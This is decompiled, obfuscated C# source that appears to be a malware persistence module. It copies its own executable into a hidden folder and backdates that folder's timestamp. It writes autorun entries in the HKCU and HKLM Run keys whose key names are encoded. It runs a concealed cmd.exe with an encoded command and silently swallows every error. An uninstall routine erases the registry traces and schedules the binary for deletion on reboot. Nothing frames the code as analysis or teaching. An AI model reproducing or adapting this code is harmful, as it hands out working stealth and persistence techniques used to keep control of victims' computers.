using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace ns0;

internal class Class7
{
	public enum Enum2
	{
		const_0,
		const_1,
		const_2
	}

	public static void smethod_0()
	{
		P();
		smethod_2();
		smethod_1();
	}

	private static void P()
	{
		try
		{
			if (!Directory.Exists(Class10.string_1))
			{
				Directory.CreateDirectory(Class10.string_1);
			}
		}
		catch
		{
		}
		try
		{
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(Class10.string_1, Class1.smethod_3(Class10.string_2, bool_0: true)), overwrite: true);
		}
		catch
		{
		}
		try
		{
			if (Class10.bool_11)
			{
				Random random = new Random();
				int day = random.Next(1, 28);
				int month = random.Next(1, 12);
				int year = random.Next(2000, DateTime.Now.Year);
				Directory.SetCreationTime(Path.Combine(Class10.string_1, Class1.smethod_3(Class10.string_2, bool_0: true)), new DateTime(year, month, day));
			}
		}
		catch
		{
		}
		if (Class10.bool_8)
		{
			try
			{
				File.SetAttributes(Class10.string_1, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
			}
			catch
			{
			}
		}
		if (Class10.bool_9)
		{
			try
			{
				File.SetAttributes(Path.Combine(Class10.string_1, Class1.smethod_2(Class10.string_2, bool_0: true)), FileAttributes.Hidden | FileAttributes.NotContentIndexed);
			}
			catch
			{
			}
		}
	}

	public static void smethod_1()
	{
		try
		{
			if (Class10.bool_1)
			{
				Registry.CurrentUser.CreateSubKey(Class1.smethod_3("FjIpNzokNSgfECwmNTI2Mik3HxosMcO+nOsnMjo2HwY4NTUoMTcZKDU2LDIxHxU4MQ==", bool_0: true)).SetValue(Class1.smethod_3(Class10.string_3, bool_0: true), Class10.string_1 + "\\" + Class1.smethod_3(Class10.string_2, bool_0: true));
			}
		}
		catch
		{
		}
		try
		{
			if (Class10.bool_2)
			{
				Registry.LocalMachine.CreateSubKey(Class1.smethod_3("FjIpNzokNSgfECwmNTI2Mik3HxosMcO+nOsnMjo2HwY4NTUoMTcZKDU2LDIxHxU4MQ==", bool_0: true)).SetValue(Class1.smethod_3(Class10.string_3, bool_0: true), Class10.string_1 + "\\" + Class1.smethod_3(Class10.string_2, bool_0: true));
			}
		}
		catch
		{
		}
		try
		{
			if (Class10.bool_3)
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(Class1.smethod_3("FhIJFxoEFQgfECwmNTI2Mik3HwQmNyw5KOPDvpzrFig3ODMfDDE2NyQvLygn4wYyMDMyMSgxNzYf", bool_0: true) + Class1.smethod_3(Class10.string_5, bool_0: true));
				registryKey.SetValue("Fjc4JcO+nOsTJDcr", Class10.string_1 + "\\" + Class1.smethod_3(Class10.string_2, bool_0: true));
				registryKey.SetValue("BjAGKzC99eEAMR4pKSIh", 1, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void smethod_2()
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo = processStartInfo;
			process.Start();
			StreamWriter standardInput = process.StandardInput;
			standardInput.WriteLine("cd " + Class10.string_1);
			standardInput.WriteLine(string.Format(Class1.smethod_3("KCYrMuMePTIxKBc1JDE2KSg1IB0yMSgMB8O+nOvjAOP14wHjPvNA/R0SEQjxLCcoMTcsKSwoNQ==", bool_0: true), Class1.smethod_3(Class10.string_2, bool_0: true)));
			standardInput.Close();
			process.Kill();
		}
		catch
		{
		}
	}

	public static void smethod_3()
	{
		try
		{
			Registry.CurrentUser.CreateSubKey(Class1.smethod_3("FjIpNzokNSgfECwmNTI2Mik3HxosMcO+nOsnMjo2HwY4NTUoMTcZKDU2LDIxHxU4MQ==", bool_0: true)).DeleteValue(Class1.smethod_3(Class10.string_3, bool_0: true));
		}
		catch
		{
		}
		try
		{
			Registry.LocalMachine.CreateSubKey(Class1.smethod_3("FjIpNzokNSgfECwmNTI2Mik3HxosMcO+nOsnMjo2HwY4NTUoMTcZKDU2LDIxHxU4MQ==", bool_0: true)).DeleteValue(Class1.smethod_3(Class10.string_4, bool_0: true));
		}
		catch
		{
		}
		try
		{
			Registry.LocalMachine.DeleteSubKey(Class1.smethod_3("FhIJFxoEFQgfECwmNTI2Mik3HwQmNyw5KOPDvpzrFig3ODMfDDE2NyQvLygn4wYyMDMyMSgxNzYf", bool_0: true) + Class1.smethod_3(Class10.string_5, bool_0: true));
		}
		catch
		{
		}
		try
		{
			switch (Class10.registryHive_0)
			{
			case RegistryHive.CurrentUser:
				Registry.CurrentUser.DeleteSubKey(Class10.string_9);
				break;
			case RegistryHive.LocalMachine:
				Registry.LocalMachine.DeleteSubKey(Class10.string_9);
				break;
			}
		}
		catch
		{
		}
		smethod_4();
	}

	public static void smethod_4()
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			File.Delete(tempFileName);
			File.Move(Process.GetCurrentProcess().MainModule!.FileName, tempFileName);
			Class4.MoveFileEx(tempFileName, null, Class4.Enum1.flag_2);
		}
		catch (Exception)
		{
		}
	}
}
